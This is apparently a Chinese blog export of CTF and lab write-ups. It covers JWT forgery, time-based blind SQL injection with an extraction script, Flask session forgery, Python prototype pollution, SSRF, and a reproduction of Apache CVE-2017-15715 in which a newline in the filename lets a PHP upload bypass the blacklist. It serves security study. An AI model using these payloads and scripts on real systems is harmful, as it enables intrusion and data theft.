伪造JWT知识点\n\n参考文章：[JWT及JWT伪造](https://blog.csdn.net/qq_45521281/article/details/106073624)\n\n首先需要了解的就是传统的session认证和基于token的鉴权机制的区别，session伪造之前有学过，这里就直接讲后者了\n\n## 基于token的鉴权机制\n\n基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着**基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了**，这就为应用的扩展提供了便利。\n\n机制流程：\n\n- 用户使用用户名密码来请求服务器\n- 服务器进行验证用户的信息\n- **服务器通过验证发送给用户一个token**\n- **客户端存储token，并在每次请求时附送上这个token值**\n- 服务端验证token值，并返回数据\n\n然后就是JWT的构成\n\n## JWT的构成\n\nJWT的数据格式分为三个部分： headers , payloads，signature(签名)，它们使用`.`点号分割。\n\n头部（header)\n\n将json进行base64就组成了JWT的头部\n\njwt的头部承载两部分信息：\n\n- **声明类型**\n- **声明加密的算法**，通常直接使用 HMAC SHA256。这的加密算法也就是签名算法。\n\n例如这道题目中的第一段解密后就是\n\n```\n{\"typ\":\"JWT\",\"alg\":\"HS256\"}\n```\n\n载荷（payload）\n\n载荷就是**存放有效信息的地方**。这个名字像是特指飞机上承载的货品，**这些有效信息包含三个部分**\n\n- 标准中注册的声明\n- 公共的声明\n- 私有的声明\n\n例如我们题目中的第二部分进行base64解密后就是\n\n```\n{\"iss\":\"Starven\",\"aud\":\"Ctfer\",\"iat\":1742903065,\"nbf\":1742903065,\"exp\":1742910265,\"username\":\"Starven\",\"password\":\"qwert123456\",\"hasFlag\":false}\n```\n\n签证（signature）\njwt的第三部分是一个签证信息，这个签证信息由三部分组成：\n\n- header (base64加密后的)\n\n- payload (base64加密后的)\n- secret\n\n这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。\n\n**注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端是可以自我签发jwt了。**\n\n所以我们这道题中的key应该就是secret私钥，接下来我们讲JWT token破解绕过\n\n## JWT token破解绕过\n\n基于刚刚我们把token进行解密可以看到外面需要将hasFlag改为true，而且要通过服务器的验证，这点很重要，并不是直接把false改成true就万事大吉了。因为服务器收到token后会对token的有效性进行验证。\n\n验证方法：首先服务端会产生一个key，然后以这个key作为密钥，使用第一部分选择的加密方式（这里就是HS256），对第一部分和第二部分拼接的结果进行加密，然后把加密结果放到第三部分。\n\n服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。\n\n因为加密算法我们已经知道了，我们只要再得到加密的key，我们就能伪造数据，并且通过服务器的检查。\n\nJWT破解工具：https://github.com/brendan-rius/c-jwt-cracker\n\n解码网站：https://jwt.io/\n\n![image-20250325200849930](../image/achieve/202411/极客大挑战2024/image-20250325200849930.png)\n\n解密网站：https://www.bejson.com/jwt/\n\n![image-20250325202257551](../image/achieve/202411/极客大挑战2024/image-20250325202257551.png)\n\n设置为true后放入key进行编码，然后传入cookie请求头中\n\n总的payload就是\n\n```\nPOST /?welcome=geekchallenge2024 HTTP/1.1\nHost: 80-702bb6be-bcc4-4300-a30e-b7101cc44548.challenge.ctfplus.cn\nContent-Length: 37\nCache-Control: max-age=0\nOrigin: http://80-702bb6be-bcc4-4300-a30e-b7101cc44548.challenge.ctfplus.cn\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: https://www.sycsec.com\nX-Real-IP: 127.0.0.1\nSTARVEN: I_Want_Flag\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\ncookie:token= eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3NDI5MDQ2MDksIm5iZiI6MTc0MjkwNDYwOSwiZXhwIjoxNzQyOTExODA5LCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6dHJ1ZX0.EJpNrB7OOHahdDVAwhXz-bgCJbApP8hUxBqgku2husk\nConnection: keep-alive\n\nusername=Starven&password=qwert123456\n```\n\n# funnySQL\n\n## #时间盲注\n\n就是一个简单的SQL啦 - SYC{}内的字母全为小写\n\n![image-20250326190252228](../image/achieve/202411/极客大挑战2024/image-20250326190252228.png)\n\n需要提交username，没啥信息泄露，先测试一下吧\n\n测试了一下发现有黑名单过滤，会返回警告\n\n![image-20250326190918035](../image/achieve/202411/极客大挑战2024/image-20250326190918035.png)\n\n那就直接fuzz吧，测试的黑名单大致如下\n\n```php\nif(preg_match('/and|or| |\\n|--|sleep|=|ascii/i',$str)){\n    die('不准用！');\n}\n```\n\n页面无回显也没报错，也没有正确与否的页面反馈，那就考虑时间盲注了\n\nsleep被过滤了很好绕，可以用benchmark，=号可以用like去绕过，空格可以用/**/去绕过,先测试一下大致的延时\n\n```\n?username='||if(1,benchmark(2000000,sha1(1)),0)%23//休眠3.6秒左右\n```\n\n先爆数据库，payload：\n\n```python\n?username='||if((substr(database(),{i},1)/**/like/**/'{j}'),benchmark(2000000,sha1(1)),0)%23\n#数据库名为syclover\n```\n\n这里还需要打无列名注入，因为or被ban了，information和performance这俩库都不能用，可以用innodb表，payload如下\n\n```python\n?username='||if((substr((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/'syclover'),{i},1)/**/like/**/'{j}'),benchmark(10000000,sha1(1)),0)%23\n#表名有Rea11ys3ccccccr3333t,users\n```\n\n一开始没爆出来，后面发现数据库是小写的syclover，可能跟数据库默认的大小写规则有关\n\n![image-20250327192539217](../image/achieve/202411/极客大挑战2024/image-20250327192539217.png)\n\n第一次爆表名的时候没注意到一个细节，如果设置j的范围是32-128的话，小写字母都会在`_`的时候卡住，这是因为**like的模糊匹配机制**导致的`_`可以匹配任意一个字符。所以需要改成准确的dict字符串去进行遍历\n\n然后就是爆表中列名了，因为这里没过滤union和select，我们可以用union取别名去爆列中数据，但是我这里是直接把Rea11ys3ccccccr3333t的数据全部爆出来的，因为刚好表中就只有flag。\n\n```python\nimport time\nimport requests\nimport datetime\n\nurl = \"http://80-90a9708b-3563-4bfb-a6cd-544252819a6f.challenge.ctfplus.cn/index.php\"\n\ndict = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#&'()*+,-./:;<=>?@[\\]^`{|}~\"\ntable = \"\"\nfor i in range(1,50):\n    sign = 0\n    for j in dict:\n        payload = f\"?username='||if((substr((select/**/*/**/from/**/Rea11ys3ccccccr3333t),{i},1)/**/like/**/'{j}'),benchmark(5000000,sha1(1)),0)%23\"\n        print(payload)\n\n        time1 = datetime.datetime.now()\n\n        r = requests.get(url+payload)\n\n        time2 = datetime.datetime.now()\n        sec = (time2-time1).seconds\n        if sec > 2.5 :\n            sign = 1\n            table += j\n            print(table)\n            break\n    if sign == 0 :\n        break\nprint(table)\n```\n\n\n\n# py_game\n\n一个注册和登录界面，注册后登录\n\n![image-20250326161419115](../image/achieve/202411/极客大挑战2024/image-20250326161419115.png)\n\n提示只有admin才能访问admin面板，扫目录的时候看到有admin路径，但是访问的时候跳转到login登录界面了，猜测是需要伪造admin身份去登录才能访问\n\n有小游戏，在/play源码中得到提示\n\n```\n<!--嘿嘿,游戏通关也不会有flag 听说flag在/flag哦-->\n```\n\n给了flag的位置，此外就没啥可用的信息了，抓包之后也没看到有什么提示\n\n## #伪造session\n\n然后在注册页面输入admin之后显示用户名已存在，让我想起来之前sql的一个漏洞，用sql的验证机制去绕过尝试匹配admin登录，但是失败了\n\n后来发现登录后的页面有session，试着用flask-unsign去解密\n\n![image-20250326162846365](../image/achieve/202411/极客大挑战2024/image-20250326162846365.png)\n\n是flask下的session，猜测是利用session伪造admin，爆破一下密钥\n\n![image-20250326163448792](../image/achieve/202411/极客大挑战2024/image-20250326163448792.png)\n\n伪造身份\n\n![image-20250326163603956](../image/achieve/202411/极客大挑战2024/image-20250326163603956.png)\n\n在页面修改session然后刷新\n\n![image-20250326163645089](../image/achieve/202411/极客大挑战2024/image-20250326163645089.png)\n\n这时候可用访问/admin路径了，有备份源码app.pyc，需要反编译\n\n## #反编译+原型链污染\n\n安装uncompyle6然后用这个进行反编译\n\n```\npip install uncompyle6//安装python反编译器\nuncompyle6 -o . app.pyc\n```\n\n拿到app.py\n\n```py\n# uncompyle6 version 3.9.2\n# Python bytecode version base 3.6 (3379)\n# Decompiled from: Python 3.12.8 (tags/v3.12.8:2dc476b, Dec  3 2024, 19:30:04) [MSC v.1942 64 bit (AMD64)]\n# Embedded file name: ./tempdata/1f9adc12-c6f3-4a8a-9054-aa3792d2ac2e.py\n# Compiled at: 2024-11-01 17:37:26\n# Size of source mod 2**32: 5558 bytes\nimport json\nfrom lxml import etree\nfrom flask import Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify\napp = Flask(__name__)\napp.secret_key = \"a123456\"\napp.config[\"xml_data\"] = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><GeekChallenge2024><EventName>Geek Challenge</EventName><Year>2024</Year><Description>This is a challenge event for geeks in the year 2024.</Description></GeekChallenge2024>'\n\nclass User:\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def check(self, data):\n        return self.username == data[\"username\"] and self.password == data[\"password\"]\n\n\nadmin = User(\"admin\", \"123456j1rrynonono\")\nUsers = [admin]\n\ndef update(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, \"__getitem__\"):\n            if dst.get(k):\n                if isinstance(v, dict):\n                    update(v, dst.get(k))\n            dst[k] = v\n        elif hasattr(dst, k) and isinstance(v, dict):\n            update(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\n\n@app.route(\"/register\", methods=[\"GET\", \"POST\"])\ndef register():\n    if request.method == \"POST\":\n        username = request.form[\"username\"]\n        password = request.form[\"password\"]\n        for u in Users:\n            if u.username == username:\n                flash(\"用户名已存在\", \"error\")\n                return redirect(url_for(\"register\"))\n\n        new_user = User(username, password)\n        Users.append(new_user)\n        flash(\"注册成功！请登录\", \"success\")\n        return redirect(url_for(\"login\"))\n    else:\n        return render_template(\"register.html\")\n\n\n@app.route(\"/login\", methods=[\"GET\", \"POST\"])\ndef login():\n    if request.method == \"POST\":\n        username = request.form[\"username\"]\n        password = request.form[\"password\"]\n        for u in Users:\n            if u.check({'username':username,  'password':password}):\n                session[\"username\"] = username\n                flash(\"登录成功\", \"success\")\n                return redirect(url_for(\"dashboard\"))\n\n        flash(\"用户名或密码错误\", \"error\")\n        return redirect(url_for(\"login\"))\n    else:\n        return render_template(\"login.html\")\n\n\n@app.route(\"/play\", methods=[\"GET\", \"POST\"])\ndef play():\n    if \"username\" in session:\n        with open(\"/app/templates/play.html\", \"r\", encoding=\"utf-8\") as file:\n            play_html = file.read()\n        return play_html\n    else:\n        flash(\"请先登录\", \"error\")\n        return redirect(url_for(\"login\"))\n\n\n@app.route(\"/admin\", methods=[\"GET\", \"POST\"])\ndef admin():\n    if \"username\" in session:\n        if session[\"username\"] == \"admin\":\n            return render_template(\"admin.html\", username=(session[\"username\"]))\n    flash(\"你没有权限访问\", \"error\")\n    return redirect(url_for(\"login\"))\n\n\n@app.route(\"/downloads321\")\ndef downloads321():\n    return send_file(\"./source/app.pyc\", as_attachment=True)\n\n\n@app.route(\"/\")\ndef index():\n    return render_template(\"index.html\")\n\n\n@app.route(\"/dashboard\")\ndef dashboard():\n    if \"username\" in session:\n        is_admin = session[\"username\"] == \"admin\"\n        if is_admin:\n            user_tag = \"Admin User\"\n        else:\n            user_tag = \"Normal User\"\n        return render_template(\"dashboard.html\", username=(session[\"username\"]), tag=user_tag, is_admin=is_admin)\n    else:\n        flash(\"请先登录\", \"error\")\n        return redirect(url_for(\"login\"))\n\n\n@app.route(\"/xml_parse\")\ndef xml_parse():\n    try:\n        xml_bytes = app.config[\"xml_data\"].encode(\"utf-8\")\n        parser = etree.XMLParser(load_dtd=True, resolve_entities=True)\n        tree = etree.fromstring(xml_bytes, parser=parser)\n        result_xml = etree.tostring(tree, pretty_print=True, encoding=\"utf-8\", xml_declaration=True)\n        return Response(result_xml, mimetype=\"application/xml\")\n    except etree.XMLSyntaxError as e:\n        return str(e)\n\n\nblack_list = [\n \"__class__\".encode(), \"__init__\".encode(), \"__globals__\".encode()]\n\ndef check(data):\n    print(data)\n    for i in black_list:\n        print(i)\n        if i in data:\n            print(i)\n            return False\n\n    return True\n\n\n@app.route(\"/update\", methods=[\"POST\"])\ndef update_route():\n    if \"username\" in session:\n        if session[\"username\"] == \"admin\":\n            if request.data:\n                try:\n                    if not check(request.data):\n                        return ('NONONO, Bad Hacker', 403)\n                    else:\n                        data = json.loads(request.data.decode())\n                        print(data)\n                        if all(\"static\" not in str(value) and \"dtd\" not in str(value) and \"file\" not in str(value) and \"environ\" not in str(value) for value in data.values()):\n                            update(data, User)\n                            return (jsonify({\"message\": \"更新成功\"}), 200)\n                        return ('Invalid character', 400)\n                except Exception as e:\n                    return (\n                     f\"Exception: {str(e)}\", 500)\n\n        else:\n            return ('No data provided', 400)\n    else:\n        flash(\"你没有权限访问\", \"error\")\n        return redirect(url_for(\"login\"))\n\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=80, debug=False)\n\n```\n\n关注一段比较重要的内容\n\n```py\ndef update(src, dst):\n    for k, v in src.items():#遍历src的键值对\n        if hasattr(dst, \"__getitem__\"):#键值对字典形式，检测dst是否为字典\n            if dst.get(k):\n                if isinstance(v, dict):#检测是否存在键k且判断v是否为字典\n                    update(v, dst.get(k))#递归调用\n            dst[k] = v#将 src 中的键值对更新到 dst 中。\n        elif hasattr(dst, k) and isinstance(v, dict):#dst不是字典但是包含属性k，且v为字典\n            update(v, getattr(dst, k))#递归调用更新对象的属性\n        else:\n            setattr(dst, k, v)\n            payload = {\n    \"__class__\" : {\n        \"__base__\" : {\n            \"secret\" : \"world\"\n        }\n    }\n}\n```\n\n最经典的原型链污染中的merge函数，考虑python原型链污染，当时这个点有点忘记了，于是回去复习了一波\n\n# ez_SSRF\n\nlhRaMk7写了个计算器网站用来通过他的小升初数学考试，Parar看不惯直接黑了他的网站不给他作弊，你们觉得能让他作弊吗\n\n打开只有一句话\n\n```\nMaybe you should check check some place in my website\n```\n\n让我们检查一下，那就常规搜集一下可用的信息，有www.zip压缩文件\n\n```php\n//h4d333333.php\n<?php\nerror_reporting(0);\nif(!isset($_POST['user'])){\n    $user=\"stranger\";\n}else{\n    $user=$_POST['user'];\n}\n\nif (isset($_GET['location'])) {\n    $location=$_GET['location'];\n    $client=new SoapClient(null,array(\n        \"location\"=>$location,\n        \"uri\"=>\"hahaha\",\n        \"login\"=>\"guest\",\n        \"password\"=>\"gueeeeest!!!!\",\n        \"user_agent\"=>$user.\"'s Chrome\"));\n\n    $client->calculator();\n\n    echo file_get_contents(\"result\");\n}else{\n    echo \"Please give me a location\";\n}\n```\n\n```php\n//calculator.php\n<?php\n$admin=\"aaaaaaaaaaaadmin\";\n$adminpass=\"i_want_to_getI00_inMyT3st\";\n\nfunction check($auth) {\n    global $admin,$adminpass;\n    $auth = str_replace('Basic ', '', $auth);\n    $auth = base64_decode($auth);\n    list($username, $password) = explode(':', $auth);\n    echo $username.\"<br>\".$password;\n    if($username===$admin && $password===$adminpass) {\n        return 1;\n    }else{\n        return 2;\n    }\n}\nif($_SERVER['REMOTE_ADDR']!==\"127.0.0.1\"){\n    exit(\"Hacker\");\n}\n$expression = $_POST['expression'];\n$auth=$_SERVER['HTTP_AUTHORIZATION'];\nif(isset($auth)){\n    if (check($auth)===2) {\n        if(!preg_match('/^[0-9+\\-*\\/]+$/', $expression)) {\n            die(\"Invalid expression\");\n        }else{\n            $result=eval(\"return $expression;\");\n            file_put_contents(\"result\",$result);\n        }\n    }else{\n        $result=eval(\"return $expression;\");\n        file_put_contents(\"result\",$result);\n    }\n}else{\n    exit(\"Hacker\");\n}\n```\n\ncalculator.php限制了只能本地用户去访问\n","tags":["极客大挑战2024"],"categories":["赛题wp"]},{"title":"CVE-2017-15715漏洞复现","url":"/2025/03/25/CVE-2017-15715漏洞复现/","content":"\n## 漏洞信息\n\n### 0x01漏洞描述\n\nApache HTTPD是一款HTTP服务器，它可以通过mod_PHP来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略。\n\n### 0x02影响版本\n\nApache HTTPD 2.4.0~2.4.29\n\n### 0x03漏洞分析\n\nindex.php源码\n\n```php\n<?php\nif(isset($_FILES['file'])) {\n    $name = basename($_POST['name']);\n    $ext = pathinfo($name,PATHINFO_EXTENSION);\n    if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) {\n        exit('bad file');\n    }\n    move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);\n} else {\n\n?>\n\n<!DOCTYPE html>\n<html>\n<head>\n        <title>Upload</title>\n</head>\n<body>\n<form method=\"POST\" enctype=\"multipart/form-data\">\n        <p>\n                <label>file:<input type=\"file\" name=\"file\"></label>\n        </p>\n        <p>\n                <label>filename:<input type=\"text\" name=\"name\" value=\"evil.php\"></label>\n        </p>\n        <input type=\"submit\">\n</form>\n</body>\n</html>\n\n<?php\n}\n?>\n\n```\n\n以POST请求方式传入参数name，并通过设置黑名单来过滤后缀。\n\n配置文件\n\n```\n#cat /etc/apache2/conf-available/docker-php.conf\n\n<FilesMatch \\.php$>\n        SetHandler application/x-httpd-php\n</FilesMatch>\n\nDirectoryIndex disabled\nDirectoryIndex index.php index.html\n\n<Directory /var/www/>\n        Options -Indexes\n        AllowOverride All\n</Directory>\n```\n\n`.php$`使用$来匹配以.php为后缀的文件，那么在文件名后插入换行符`\\x0A`则可以绕过php黑名单，实现文件上传。\n\n## 漏洞复现\n\n### 0x04靶场搭建\n\n使用vulhub靶场，编译运行漏洞环境\n\n```\ncd vulhub/httpd/CVE-2017-15715\ndocker-compose build\ndocker-compose up -d\n```\n\n![image-20250325095648754](../image/achieve/202411/CVE复现/image-20250325095648754.png)\n\n![image-20250325095825209](../image/achieve/202411/CVE复现/image-20250325095825209.png)\n\n### 0x05开始复现\n\n访问一下\n\n![image-20250325095907941](../image/achieve/202411/CVE复现/image-20250325095907941.png)\n\n上传成功，那我们先来分析漏洞的源码\n\n```\n<FilesMatch \\.php$>\n        SetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n这段代码是 Apache 服务器配置文件（如 `.htaccess` 或 `httpd.conf`）中的一段配置，用于指定如何处理 `.php` 文件，利用正则表达式$的特性 <FilesMatch \\.php$> 他会匹配换行符将其成功执行\n\n那我们先上传一个php文件\n\n```php\n<?php phpinfo();?>\n```\n\n抓包后的请求包\n\n```\nPOST / HTTP/1.1\nHost: 156.238.233.87:8080\nContent-Length: 322\nCache-Control: max-age=0\nOrigin: http://156.238.233.87:8080\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryZjli9OyS81w7mfPk\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://156.238.233.87:8080/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: keep-alive\n\n------WebKitFormBoundaryZjli9OyS81w7mfPk\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Type: application/octet-stream\n\n<?php phpinfo();?>\n------WebKitFormBoundaryZjli9OyS81w7mfPk\nContent-Disposition: form-data; name=\"name\"\n\nevil.php\n------WebKitFormBoundaryZjli9OyS81w7mfPk--\n\n```\n\n发包显示bad file\n\n然后我们来看index.php对文件的处理\n\n```php\n<?php\nif(isset($_FILES['file'])) {\n    $name = basename($_POST['name']);\n    $ext = pathinfo($name,PATHINFO_EXTENSION);\n    if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) {\n        exit('bad file');\n    }\n    move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);\n} else {\n\n?>\n```\n\n原来这里是对我们的name参数进行的过滤操作，在上面的请求包中name参数就是evil.php，所以我们尝试换成txt后缀\n\n```\nPOST / HTTP/1.1\nHost: 156.238.233.87:8080\nContent-Length: 310\nCache-Control: max-age=0\nOrigin: http://156.238.233.87:8080\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryZjli9OyS81w7mfPk\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://156.238.233.87:8080/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: keep-alive\n\n------WebKitFormBoundaryZjli9OyS81w7mfPk\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Type: application/octet-stream\n\n<?php phpinfo();?>\n------WebKitFormBoundaryZjli9OyS81w7mfPk\nContent-Disposition: form-data; name=\"name\"\n\nevil.txt\n------WebKitFormBoundaryZjli9OyS81w7mfPk--\n\n```\n\n上传成功，然后访问evil.txt\n\n![image-20250325101405797](../image/achieve/202411/CVE复现/image-20250325101405797.png)\n\n正常回显，那我们利用漏洞点绕过黑名单，加个%0a，注意这里不是直接在后缀名上加\n\n而是修改name参数值，点击hex，找到文件名，在.php后插入一个换行符\\x0A，文件上传成功\n\n![image-20250325101734048](../image/achieve/202411/CVE复现/image-20250325101734048.png)\n\n然后我们访问evil.php%0a\n\n发现成功执行\n\n![image-20250325101941648](../image/achieve/202411/CVE复现/image-20250325101941648.png)\n\n### 0x06修复建议\n\n1. 升级apache版本\n2. 利用时间戳、随机数等方法对上传文件进行重命名\n3. 禁止上传文件执行\n","tags":["漏洞复现"],"categories":["CVE"]},{"title":"极客大挑战2020wp--web(已做完)","url":"/2025/03/24/极客大挑战2020wp-web(已做完)/","content":"\n# web-Welcome\n\n## #请求方法+sha1哈希绕过\n\n![image-20250111103144660](../image/achieve/202411/极客大挑战2020/image-20250111103144660.png)\n\n打开是405错误，抓包后看到是Method Not Allowed\n\n![image-20250111103817580](../image/achieve/202411/极客大挑战2020/image-20250111103817580.png)\n\n搜索后发现是请求方式错误，换成POST传参就可以拿到源码了\n\n```php\n<?php\nerror_reporting(0);\nif ($_SERVER['REQUEST_METHOD'] !== 'POST') {\nheader(\"HTTP/1.1 405 Method Not Allowed\");\nexit();\n} else {\n    \n    if (!isset($_POST['roam1']) || !isset($_POST['roam2'])){\n        show_source(__FILE__);\n    }\n    else if ($_POST['roam1'] !== $_POST['roam2'] && sha1($_POST['roam1']) === sha1($_POST['roam2'])){\n        phpinfo();  // collect information from phpinfo!\n    }\n}\n```\n\n前面都是刚刚遇到的，我们只需要关注最后一个else if语句就可以了\n\n一个简单的sha1哈希绕过，传数组就可以了\n\n![image-20250111105042421](../image/achieve/202411/极客大挑战2020/image-20250111105042421.png)\n\n然后在里面查找flag就可以了\n\n# web-Myblog\n\n## #任意文件读取+zip伪协议文件上传\n\n![image-20250111131938206](../image/achieve/202411/极客大挑战2020/image-20250111131938206.png)\n\n可以看到有登录入口，测试一下\n\n![image-20250111132028751](../image/achieve/202411/极客大挑战2020/image-20250111132028751.png)\n\n输入1和1后页面显示\n\n![image-20250111132049726](../image/achieve/202411/极客大挑战2020/image-20250111132049726.png)\n\n可以看到url中有admin和user，应该是需要管理员登陆，我们先fuzz一下sql注入什么的，但是发现打不进去，后来发现在url中有?page=login参数，猜测可能是任意文件读取漏洞，试一下\n\n```php\n/?page=php://filter/read=convert.base64-encode/resource=login.php\n```\n\n没读出来，但是根据之前的url猜测是闭合了php\n\n```\n/?page=php://filter/read=convert.base64-encode/resource=login\n```\n\n```html\n//login.php\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <title>Login</title>\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n    <meta name=\"robots\" content=\"all,follow\">\n    <link rel=\"stylesheet\" href=\"https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/css/bootstrap.min.css\">\n    <link rel=\"stylesheet\" href=\"css/style.default.css\" id=\"theme-stylesheet\">\n  </head>\n  <body>\n    <div class=\"page login-page\">\n      <div class=\"container d-flex align-items-center\">\n        <div class=\"form-holder has-shadow\">\n          <div class=\"row\">\n            <!-- Logo & Information Panel-->\n            <div class=\"col-lg-6\">\n              <div class=\"info d-flex align-items-center\">\n                <div class=\"content\">\n                  <div class=\"logo\">\n                    <h1>欢迎登录</h1>\n                  </div>\n                  <p>—— 博客后台 ——</p>\n                </div>\n              </div>\n            </div>\n            <!-- Form Panel    -->\n            <div class=\"col-lg-6 bg-white\">\n              <div class=\"form d-flex align-items-center\">\n                <div class=\"content\">\n                  <form method=\"post\" action=\"/?page=admin/user\" class=\"form-validate\" id=\"loginFrom\">\n                    <div class=\"form-group\">\n                      <input id=\"login-username\" type=\"text\" name=\"username\" required data-msg=\"请输入用户名\" placeholder=\"用户名\" class=\"input-material\">\n                    </div>\n                    <div class=\"form-group\">\n                      <input id=\"login-password\" type=\"password\" name=\"password\" required data-msg=\"请输入密码\" placeholder=\"密码\" class=\"input-material\">\n                    </div>\n                    <button id=\"login\" type=\"submit\" class=\"btn btn-primary\">登录</button>\n                    <div style=\"margin-top: -40px;\"> \n                    \t<!-- <input type=\"checkbox\"  id=\"check1\"/>&nbsp;<span>记住密码</span>\n                    \t<input type=\"checkbox\" id=\"check2\"/>&nbsp;<span>自动登录</span> -->\n                    \t<div class=\"custom-control custom-checkbox \" style=\"float: right;\">\n\t\t\t\t\t\t\t\t\t\t\t    <input type=\"checkbox\" class=\"custom-control-input\" id=\"check2\" >\n\t\t\t\t\t\t\t\t\t\t\t    <label class=\"custom-control-label\" for=\"check2\">自动登录</label>\n\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t\t<div class=\"custom-control custom-checkbox \" style=\"float: right;\">\n\t\t\t\t\t\t\t\t\t\t\t    <input type=\"checkbox\" class=\"custom-control-input\" id=\"check1\" >\n\t\t\t\t\t\t\t\t\t\t\t    <label class=\"custom-control-label\" for=\"check1\">记住密码&nbsp;&nbsp;</label>\n\t\t\t\t\t\t\t\t\t\t\t</div> \n                    </div>\n                  </form>\n                  <br />\n                  <small>没有账号?</small><a href=\"#\" class=\"signup\">&nbsp;不给注册</a>\n                </div>\n              </div>\n            </div>\n          </div>\n        </div>\n      </div>\n    </div>\n    <!-- JavaScript files-->\n    <script src=\"https://libs.baidu.com/jquery/1.10.2/jquery.min.js\"></script>\n    <script src=\"https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/bootstrap.min.js\"></script>\n    <script src=\"vendor/jquery-validation/jquery.validate.min.js\"></script><!--表单验证-->\n    <!-- Main File-->\n    <script src=\"js/front.js\"></script>\n  </body>\n</html>\n\n<?php\nrequire_once(\"secret.php\");\nmt_srand($secret_seed);\n$_SESSION['password'] = mt_rand();\n?>\n\n```\n\n```php\n//secret.php\n<?php\n$secret_seed = mt_rand();\n?>\n```\n\n```php\n//admin/user\n<?php\nerror_reporting(0);\nsession_start();\n$logined = false;\nif (isset($_POST['username']) and isset($_POST['password'])){\n\tif ($_POST['username'] === \"Longlone\" and $_POST['password'] == $_SESSION['password']){  // No one knows my password, including myself\n\t\t$logined = true;\n\t\t$_SESSION['status'] = $logined;\n\t}\n}\nif ($logined === false && !isset($_SESSION['status']) || $_SESSION['status'] !== true){\n    echo \"<script>alert('username or password not correct!');window.location.href='index.php?page=login';</script>\";\n\tdie();\n}\n?>\n```\n\n最后一个是我没想到的，尽管看着不像文件，但是还是读取出来了emm\n\n这里我们分析一下代码，需要让username=Longlone，然后密码的话是session中password的值，也就是经过随机后的值，那我们怎么去拿到password的值呢？\n\n碰撞基本上是不可能的，我们把cookie中的值删除，令password为空，那我们的username对应的password为空的话就可以绕过验证了，但是好像必须输入密码，那我们把密码对应的HTML中 required 